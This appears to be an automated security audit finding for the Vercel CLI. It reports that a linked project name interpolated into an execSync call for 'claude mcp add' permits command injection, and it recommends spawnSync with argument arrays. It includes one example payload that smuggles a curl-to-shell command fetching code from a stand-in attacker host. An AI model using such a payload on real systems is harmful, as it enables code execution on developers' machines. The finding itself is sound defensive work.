# [MEDIUM] Command injection via linked project name in `claude mcp add` execSync

**File:** [`packages/cli/src/commands/mcp/mcp.ts`](https://github.com/vercel/vercel/blob/melkey/bun-working-branch/blob/melkey/packages/cli/src/commands/mcp/mcp.ts#L189-L191) (lines 189, 190, 191)
**Project:** vercel
**Severity:** MEDIUM  •  **Confidence:** high  •  **Slug:** `rce`

## Owners

**Suggested assignee:** `25040341+brookemosby@users.noreply.github.com` _(via last-committer)_

## Finding

Line 189-191 builds a shell command string by interpolating `mcpName` (containing `project.name` from the linked project) and `mcpUrl` (containing `org.slug` and `project.name`) directly into a shell command passed to `safeExecSync`/`execSync`. `safeExecSync` calls `execSync(command, ...)` which spawns through a shell, so any shell metacharacters in the project name or org slug result in arbitrary command execution. Project metadata flows from `getLinkedProject()` which combines local `.vercel/project.json` data with API responses (`getProjectByIdOrName`, `getOrgById`). While Vercel's API generally enforces alphanumeric+hyphen naming, a maliciously crafted local link file (e.g., committed to a repo, copied from another machine, or written by malware) — or any server-side validation edge case — would yield local RCE on the developer's machine. Example payload: a `project.name` of `foo;curl evil.com|sh;true` would shell-execute the embedded command. The shared `safeExecSync` wrapper catches errors but does not sanitize input.

## Recommendation

Use `execFile`/`spawn` with arg arrays (no shell), e.g. `spawnSync('claude', ['mcp', 'add', '--transport', 'http', mcpName, mcpUrl])`. Alternatively, validate project names and org slugs against a strict allowlist regex (e.g., `/^[a-z0-9][a-z0-9-]{0,99}$/`) before passing to any shell command.

## Recent committers (`git log`)

- Brooke <25040341+brookemosby@users.noreply.github.com> (2026-03-11)
- Thomas Knickman <tom.knickman@vercel.com> (2026-03-04)
